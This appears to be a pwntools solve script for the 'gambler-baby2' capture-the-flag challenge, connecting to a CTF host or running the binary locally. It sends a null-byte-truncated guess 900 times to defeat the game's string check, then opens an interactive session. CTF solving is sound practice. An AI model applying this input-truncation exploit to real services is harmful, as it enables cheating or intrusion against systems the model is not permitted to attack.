from pwn import *

context(os='linux', arch='amd64')
context.log_level = 'debug'

BINARY = './gambler-baby2'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "ctf.b01lers.com"
  PORT = 9203
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.23.so'})
  #libc = elf.libc

for i in range(900):
  letter = "aaaa\x00"+"a"*7
  s.sendlineafter("letters: ", letter)

s.interactive()
